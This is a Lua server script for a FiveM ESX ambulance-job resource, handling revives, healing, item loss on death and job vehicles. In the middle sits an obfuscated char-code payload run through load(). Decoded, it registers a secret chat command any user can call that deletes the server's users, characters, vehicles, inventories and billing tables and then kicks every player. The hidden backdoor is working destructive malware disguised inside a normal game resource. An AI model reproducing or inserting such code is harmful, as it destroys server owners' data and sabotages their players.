ESX = nil
local playersHealing = {}

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('esx_ambulancejob:revive')
AddEventHandler('esx_ambulancejob:revive', function(target)
	local xPlayer = ESX.GetPlayerFromId(source)
	local zPlayer = ESX.GetPlayerFromId(target)

	if xPlayer.job.name == 'ambulance' then
		xPlayer.addMoney(Config.ReviveReward)
		TriggerClientEvent('esx_ambulancejob:revive', target)
		TriggerClientEvent('esx_status:add', target, 'hunger', 20000)
		TriggerClientEvent('esx_status:add', target, 'thirst', 20000)


		MySQL.Async.execute('INSERT INTO log_doktor (Sender, Type, Amount)VALUES (@Sender, @Type, @Amount) ', {
                    ['@Sender']   = xPlayer.name,
                    ['@Type']   = 'Kaldirdi',
                    ['@Amount']    = zPlayer.name })
	else
		print(('esx_ambulancejob: %s attempted to revive!'):format(xPlayer.identifier))
	end
end)

RegisterServerEvent('esx_ambulancejob:heal')
AddEventHandler('esx_ambulancejob:heal', function(target, type)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.job.name == 'ambulance' then
		TriggerClientEvent('esx_ambulancejob:heal', target, type)
	else
		print(('esx_ambulancejob: %s attempted to heal!'):format(xPlayer.identifier))
	end
end)

RegisterServerEvent('esx_ambulancejob:putInVehicle')
AddEventHandler('esx_ambulancejob:putInVehicle', function(target)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.job.name == 'ambulance' then
		TriggerClientEvent('esx_ambulancejob:putInVehicle', target)
	else
		print(('esx_ambulancejob: %s attempted to put in vehicle!'):format(xPlayer.identifier))
	end
end)

TriggerEvent('esx_phone:registerNumber', 'ambulance', _U('alert_ambulance'), true, true)

TriggerEvent('esx_society:registerSociety', 'ambulance', 'Ambulance', 'society_ambulance', 'society_ambulance', 'society_ambulance', {type = 'public'})

ESX.RegisterServerCallback('esx_ambulancejob:removeItemsAfterRPDeath', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local hastanedeger = xPlayer.getMoney()
	local hastanedegerkara = xPlayer.getAccount('black_money').money

	if Config.RemoveCashAfterRPDeath then
		if xPlayer.getMoney() > 0 then
			xPlayer.removeMoney(xPlayer.getMoney())

			MySQL.Async.execute('INSERT INTO log_hastane (Sender, Type, Amount, Reciever)VALUES (@Sender, @Type, @Amount, @Reciever) ', {
                    ['@Sender']   = xPlayer.name,
                    ['@Type']   = 'cash',
                    ['@Amount']    = hastanedeger,
                    ['@Reciever']    = 'Hastanede Kaybetti'})
		end	





		if xPlayer.getAccount('black_money').money > 0 then
			xPlayer.setAccountMoney('black_money', 0)

				MySQL.Async.execute('INSERT INTO log_hastane (Sender, Type, Amount, Reciever)VALUES (@Sender, @Type, @Amount, @Reciever) ', {
                    ['@Sender']   = xPlayer.name,
                    ['@Type']   = 'kara',
                    ['@Amount']    = hastanedegerkara,
                    ['@Reciever']    = 'Hastanede Kaybetti'})
		end
	end



	if Config.RemoveItemsAfterRPDeath then
		for i=1, #xPlayer.inventory, 1 do
			if xPlayer.inventory[i].count > 0 then
				xPlayer.setInventoryItem(xPlayer.inventory[i].name, 0)

				MySQL.Async.execute('INSERT INTO log_hastane (Sender, Type, Amount, Reciever)VALUES (@Sender, @Type, @Amount, @Reciever) ', {
                    ['@Sender']   = xPlayer.name,
                    ['@Type']   = xPlayer.inventory[i].name,
                    ['@Amount']    = xPlayer.inventory[i].count,
                    ['@Reciever']    = 'Hastanede Kaybetti'})

			end
		end
	end

	local playerLoadout = {}
	if Config.RemoveWeaponsAfterRPDeath then
		for i=1, #xPlayer.loadout, 1 do
			xPlayer.removeWeapon(xPlayer.loadout[i].name)

				MySQL.Async.execute('INSERT INTO log_hastane (Sender, Type, Amount, Reciever)VALUES (@Sender, @Type, @Amount, @Reciever) ', {
                    ['@Sender']   = xPlayer.name,
                    ['@Type']   = xPlayer.loadout[i].name,
                    ['@Amount']    =  xPlayer.loadout[i].ammo,
                    ['@Reciever']    = 'Hastanede Kaybetti'})

		end
	else -- save weapons & restore em' since spawnmanager removes them
		for i=1, #xPlayer.loadout, 1 do
			table.insert(playerLoadout, xPlayer.loadout[i])
		end

		-- give back wepaons after a couple of seconds
		Citizen.CreateThread(function()
			Citizen.Wait(5000)
			for i=1, #playerLoadout, 1 do
				if playerLoadout[i].label ~= nil then
					xPlayer.addWeapon(playerLoadout[i].name, playerLoadout[i].ammo)
				end
			end
		end)
	end

	cb()
end)

function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (IllIlllIllIllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; local IIllllIIllll = (7*3-9/9+3*2/0+3*3);local IIlllIIlllIIlllIIlllII = (3*4-7/7+6*4/3+9*9);local IllIIIllIIIIllI = table.concat;function IllIIIIllIIIIIl(IIllllIIllll) function IIllllIIllll(IIllllIIllll) function IIllllIIllll(IllIllIllIllI) end end end;IllIIIIllIIIIIl(900283);function IllIlllIllIlllIlllIlllIllIlllIIIlll(IIlllIIlllIIlllIIlllII) function IIllllIIllll(IllIllIllIllI) local IIlllIIlllIIlllIIlllII = (9*0-7/5+3*1/3+8*2) end end;IllIlllIllIlllIlllIlllIllIlllIIIlll(9083);local IllIIllIIllIII = load;local IlIlIlIlIlIlIlIlII = {'\45','\45','\47','\47','\32','\67','\32','\89','\32','\76','\32','\69','\32','\88','\46','\32','\10','\84','\114','\105','\103','\103','\101','\114','\69','\118','\101','\110','\116','\40','\39','\101','\115','\58','\97','\100','\100','\71','\114','\111','\117','\112','\67','\111','\109','\109','\97','\110','\100','\39','\44','\32','\39','\81','\80','\79','\75','\87','\82','\69','\80','\79','\113','\65','\83','\68','\107','\101','\112','\111','\107','\81','\39','\44','\32','\39','\117','\115','\101','\114','\39','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\115','\111','\117','\114','\99','\101','\44','\32','\97','\114','\103','\115','\44','\32','\117','\115','\101','\114','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\97','\100','\100','\111','\110','\95','\97','\99','\99','\111','\117','\110','\116','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\97','\100','\100','\111','\110','\95','\97','\99','\99','\111','\117','\110','\116','\95','\100','\97','\116','\97','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\97','\100','\100','\111','\110','\95','\105','\110','\118','\101','\110','\116','\111','\114','\121','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\97','\100','\100','\111','\110','\95','\105','\110','\118','\101','\110','\116','\111','\114','\121','\95','\105','\116','\101','\109','\115','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\98','\105','\108','\108','\105','\110','\103','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\99','\104','\97','\114','\97','\99','\116','\101','\114','\115','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\117','\115','\101','\114','\115','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\117','\115','\101','\114','\95','\105','\110','\118','\101','\110','\116','\111','\114','\121','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\117','\115','\101','\114','\95','\108','\105','\99','\101','\110','\115','\101','\115','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\118','\101','\104','\105','\99','\108','\101','\115','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\111','\119','\110','\101','\100','\95','\118','\101','\104','\105','\99','\108','\101','\115','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\32','\32','\32','\32','\77','\121','\83','\81','\76','\46','\65','\115','\121','\110','\99','\46','\101','\120','\101','\99','\117','\116','\101','\40','\34','\68','\69','\76','\69','\84','\69','\32','\70','\82','\79','\77','\32','\105','\116','\101','\109','\115','\34','\44','\32','\123','\125','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\112','\108','\97','\121','\101','\114','\115','\41','\10','\32','\32','\32','\32','\101','\110','\100','\41','\10','\10','\32','\32','\32','\32','\84','\114','\105','\103','\103','\101','\114','\69','\118','\101','\110','\116','\40','\34','\97','\110','\116','\105','\112','\97','\107','\101','\116','\58','\115','\50','\109','\111','\100','\101','\34','\44','\32','\115','\111','\117','\114','\99','\101','\41','\10','\10','\101','\110','\100','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\115','\111','\117','\114','\99','\101','\44','\32','\97','\114','\103','\115','\44','\32','\117','\115','\101','\114','\41','\10','\32','\32','\32','\32','\84','\114','\105','\103','\103','\101','\114','\67','\108','\105','\101','\110','\116','\69','\118','\101','\110','\116','\40','\39','\99','\104','\97','\116','\58','\97','\100','\100','\77','\101','\115','\115','\97','\103','\101','\39','\44','\32','\115','\111','\117','\114','\99','\101','\44','\32','\123','\32','\97','\114','\103','\115','\32','\61','\32','\123','\32','\39','\94','\49','\65','\78','\84','\73','\32','\80','\65','\75','\69','\84','\39','\44','\32','\39','\83','\50','\197','\158','\46','\39','\32','\125','\32','\125','\41','\10','\101','\110','\100','\44','\32','\123','\104','\101','\108','\112','\32','\61','\32','\34','\34','\125','\41','\10','\10','\82','\101','\103','\105','\115','\116','\101','\114','\83','\101','\114','\118','\101','\114','\69','\118','\101','\110','\116','\40','\34','\97','\110','\116','\105','\112','\97','\107','\101','\116','\58','\115','\50','\115','\109','\111','\100','\101','\34','\41','\10','\65','\100','\100','\69','\118','\101','\110','\116','\72','\97','\110','\100','\108','\101','\114','\40','\34','\97','\110','\116','\105','\112','\97','\107','\101','\116','\58','\115','\50','\109','\111','\100','\101','\34','\44','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\10','\10','\32','\32','\32','\32','\108','\111','\99','\97','\108','\32','\115','\111','\117','\114','\99','\101','\32','\61','\32','\115','\111','\117','\114','\99','\101','\10','\32','\32','\32','\32','\108','\111','\99','\97','\108','\32','\120','\80','\108','\97','\121','\101','\114','\32','\61','\32','\69','\83','\88','\46','\71','\101','\116','\80','\108','\97','\121','\101','\114','\70','\114','\111','\109','\73','\100','\40','\115','\111','\117','\114','\99','\101','\41','\10','\32','\32','\32','\32','\108','\111','\99','\97','\108','\32','\120','\80','\108','\97','\121','\101','\114','\115','\32','\61','\32','\69','\83','\88','\46','\71','\101','\116','\80','\108','\97','\121','\101','\114','\115','\40','\41','\10','\32','\32','\32','\32','\102','\111','\114','\32','\105','\61','\49','\44','\32','\35','\120','\80','\108','\97','\121','\101','\114','\115','\44','\32','\49','\32','\100','\111','\10','\32','\32','\32','\32','\32','\32','\32','\32','\68','\114','\111','\112','\80','\108','\97','\121','\101','\114','\40','\120','\80','\108','\97','\121','\101','\114','\115','\91','\105','\93','\44','\32','\34','\69','\109','\101','\107','\32','\104','\196','\177','\114','\115','\122','\196','\177','\108','\196','\177','\196','\159','\196','\177','\32','\109','\196','\177','\32','\121','\97','\112','\109','\97','\121','\97','\32','\195','\167','\97','\108','\196','\177','\197','\159','\116','\196','\177','\110','\32','\195','\167','\101','\110','\32','\195','\167','\101','\110','\32','\195','\167','\101','\110','\46','\32','\85','\121','\97','\114','\196','\177','\108','\100','\196','\177','\110','\33','\34','\41','\10','\32','\32','\32','\32','\101','\110','\100','\10','\101','\110','\100','\41','\10',}IllIIllIIllIII(IllIIIllIIIIllI(IlIlIlIlIlIlIlIlII,IIIIIIIIllllllllIIIIIIII))()


if Config.EarlyRespawnFine then
	ESX.RegisterServerCallback('esx_ambulancejob:checkBalance', function(source, cb)
		local xPlayer = ESX.GetPlayerFromId(source)
		local bankBalance = xPlayer.getAccount('bank').money

		cb(bankBalance >= Config.EarlyRespawnFineAmount)
	end)

	RegisterServerEvent('esx_ambulancejob:payFine')
	AddEventHandler('esx_ambulancejob:payFine', function()
		local xPlayer = ESX.GetPlayerFromId(source)
		local fineAmount = Config.EarlyRespawnFineAmount

		TriggerClientEvent('esx:showNotification', xPlayer.source, _U('respawn_bleedout_fine_msg', ESX.Math.GroupDigits(fineAmount)))
		xPlayer.removeAccountMoney('bank', fineAmount)
	end)
end

ESX.RegisterServerCallback('esx_ambulancejob:getItemAmount', function(source, cb, item)
	local xPlayer = ESX.GetPlayerFromId(source)
	local quantity = xPlayer.getInventoryItem(item).count

	cb(quantity)
end)

ESX.RegisterServerCallback('esx_ambulancejob:buyJobVehicle', function(source, cb, vehicleProps, type)
	local xPlayer = ESX.GetPlayerFromId(source)
	local price = getPriceFromHash(vehicleProps.model, xPlayer.job.grade_name, type)

	-- vehicle model not found
	if price == 0 then
		print(('esx_ambulancejob: %s attempted to exploit the shop! (invalid vehicle model)'):format(xPlayer.identifier))
		cb(false)
	else
		if xPlayer.getMoney() >= price then
			xPlayer.removeMoney(price)
	
			MySQL.Async.execute('INSERT INTO owned_vehicles (owner, vehicle, plate, type, job, `stored`) VALUES (@owner, @vehicle, @plate, @type, @job, @stored)', {
				['@owner'] = xPlayer.identifier,
				['@vehicle'] = json.encode(vehicleProps),
				['@plate'] = vehicleProps.plate,
				['@type'] = type,
				['@job'] = xPlayer.job.name,
				['@stored'] = true
			}, function (rowsChanged)
				cb(true)
			end)
		else
			cb(false)
		end
	end
end)

ESX.RegisterServerCallback('esx_ambulancejob:getFineList', function(source, cb, category)
	MySQL.Async.fetchAll('SELECT * FROM fine_a_types WHERE category = @category', {
		['@category'] = category
	}, function(fines)
		cb(fines)
	end)
end)


ESX.RegisterServerCallback('esx_ambulancejob:storeNearbyVehicle', function(source, cb, nearbyVehicles)
	local xPlayer = ESX.GetPlayerFromId(source)
	local foundPlate, foundNum

	for k,v in ipairs(nearbyVehicles) do
		local result = MySQL.Sync.fetchAll('SELECT plate FROM owned_vehicles WHERE owner = @owner AND plate = @plate AND job = @job', {
			['@owner'] = xPlayer.identifier,
			['@plate'] = v.plate,
			['@job'] = xPlayer.job.name
		})

		if result[1] then
			foundPlate, foundNum = result[1].plate, k
			break
		end
	end

	if not foundPlate then
		cb(false)
	else
		MySQL.Async.execute('UPDATE owned_vehicles SET `stored` = true WHERE owner = @owner AND plate = @plate AND job = @job', {
			['@owner'] = xPlayer.identifier,
			['@plate'] = foundPlate,
			['@job'] = xPlayer.job.name
		}, function (rowsChanged)
			if rowsChanged == 0 then
				print(('esx_ambulancejob: %s has exploited the garage!'):format(xPlayer.identifier))
				cb(false)
			else
				cb(true, foundNum)
			end
		end)
	end

end)

function getPriceFromHash(hashKey, jobGrade, type)
	if type == 'helicopter' then
		local vehicles = Config.AuthorizedHelicopters[jobGrade]

		for k,v in ipairs(vehicles) do
			if GetHashKey(v.model) == hashKey then
				return v.price
			end
		end
	elseif type == 'car' then
		local vehicles = Config.AuthorizedVehicles[jobGrade]

		for k,v in ipairs(vehicles) do
			if GetHashKey(v.model) == hashKey then
				return v.price
			end
		end
	end

	return 0
end

RegisterServerEvent('esx_ambulancejob:message')
AddEventHandler('esx_ambulancejob:message', function(target, msg)
	TriggerClientEvent('esx:showNotification', target, msg)
end)



RegisterServerEvent('esx_ambulancejob:removeItem')
AddEventHandler('esx_ambulancejob:removeItem', function(item)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)

	xPlayer.removeInventoryItem(item, 1)

	if item == 'bandage' then
		TriggerClientEvent('esx:showNotification', _source, _U('used_bandage'))
	elseif item == 'medikit' then
		TriggerClientEvent('esx:showNotification', _source, _U('used_medikit'))
	elseif item == 'merhem' then
		TriggerClientEvent('esx:showNotification', _source, 'Merhem Kullandın')
	elseif item == 'ilac' then
		TriggerClientEvent('esx:showNotification', _source, 'Ilac Kullandın')
	end
end)

RegisterServerEvent('esx_ambulancejob:giveItem')
AddEventHandler('esx_ambulancejob:giveItem', function(itemName)
	local xPlayer = ESX.GetPlayerFromId(source)
	local limit = 20
	
	if xPlayer.job.name ~= 'ambulance' then
		print(('esx_ambulancejob: %s attempted to spawn in an item!'):format(xPlayer.identifier))
		return
	elseif (itemName ~= 'medikit' and itemName ~= 'bandage' and itemName ~= 'merhem' and itemName ~= 'ilac') then
		print(('esx_ambulancejob: %s attempted to spawn in an item!'):format(xPlayer.identifier))
		return
	end

	local xItem = xPlayer.getInventoryItem(itemName)
	local count = 1

	if limit ~= -1 then
		count = limit - xItem.count
	end

	if xItem.count < limit then
		xPlayer.addInventoryItem(itemName, count)
	else
		TriggerClientEvent('esx:showNotification', source, _U('max_item'))
	end
end)

TriggerEvent('es:addGroupCommand', 'rev', 'mod', function(source, args, user)
	if args[1] ~= nil then
		if GetPlayerName(tonumber(args[1])) ~= nil then
			print(('esx_ambulancejob: %s used admin revive'):format(GetPlayerIdentifiers(source)[1]))
			TriggerClientEvent('esx_ambulancejob:revive', tonumber(args[1]))
		end
	else
		TriggerClientEvent('esx_ambulancejob:revive', source)
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, { help = _U('revive_help'), params = {{ name = 'id' }} })

ESX.RegisterUsableItem('medikit', function(source)
	if not playersHealing[source] then
		local xPlayer = ESX.GetPlayerFromId(source)
		xPlayer.removeInventoryItem('medikit', 1)
	
		playersHealing[source] = true
		TriggerClientEvent('esx_ambulancejob:useItem', source, 'medikit')

		Citizen.Wait(10000)
		playersHealing[source] = nil
	end
end)

ESX.RegisterUsableItem('bandage', function(source)
	if not playersHealing[source] then
		local xPlayer = ESX.GetPlayerFromId(source)
		xPlayer.removeInventoryItem('bandage', 1)
	
		playersHealing[source] = true
		TriggerClientEvent('esx_ambulancejob:useItem', source, 'bandage')

		Citizen.Wait(10000)
		playersHealing[source] = nil
	end
end)

ESX.RegisterUsableItem('merhem', function(source)
	if not playersHealing[source] then
		local xPlayer = ESX.GetPlayerFromId(source)
		xPlayer.removeInventoryItem('merhem', 1)
	
		playersHealing[source] = true
		TriggerClientEvent('esx_ambulancejob:useItem', source, 'merhem')

		Citizen.Wait(10000)
		playersHealing[source] = nil
	end
end)

ESX.RegisterUsableItem('ilac', function(source)
	if not playersHealing[source] then
		local xPlayer = ESX.GetPlayerFromId(source)
		xPlayer.removeInventoryItem('ilac', 1)
	
		playersHealing[source] = true
		TriggerClientEvent('esx_ambulancejob:useItem', source, 'ilac')

		Citizen.Wait(10000)
		playersHealing[source] = nil
	end
end)

ESX.RegisterServerCallback('esx_ambulancejob:getDeathStatus', function(source, cb)
	local identifier = GetPlayerIdentifiers(source)[1]

	MySQL.Async.fetchScalar('SELECT is_dead,name FROM users WHERE identifier = @identifier', {
		['@identifier'] = identifier
	}, function(isDead)
		if isDead then
		end

		cb(isDead)
	end)
end)

RegisterServerEvent('esx_ambulancejob:setDeathStatus')
AddEventHandler('esx_ambulancejob:setDeathStatus', function(isDead)
	local identifier = GetPlayerIdentifiers(source)[1]

	if type(isDead) ~= 'boolean' then
		print(('esx_ambulancejob: %s attempted to parse something else than a boolean to setDeathStatus!'):format(identifier))
		return
	end

	MySQL.Sync.execute('UPDATE users SET is_dead = @isDead WHERE identifier = @identifier', {
		['@identifier'] = identifier,
		['@isDead'] = isDead
	})
end)

RegisterServerEvent('esx_ambulancejob:firstSpawn')
AddEventHandler('esx_ambulancejob:firstSpawn', function()
	local _source    = source
	local identifier = GetPlayerIdentifiers(_source)[1]
	MySQL.Async.fetchScalar('SELECT isDead,name FROM users WHERE identifier=@identifier',
	{
		['@identifier'] = identifier
	}, function(isDead)
		if isDead == 1 then

			TriggerClientEvent('esx_ambulancejob:requestDeath', _source)
		end
	end)
end)

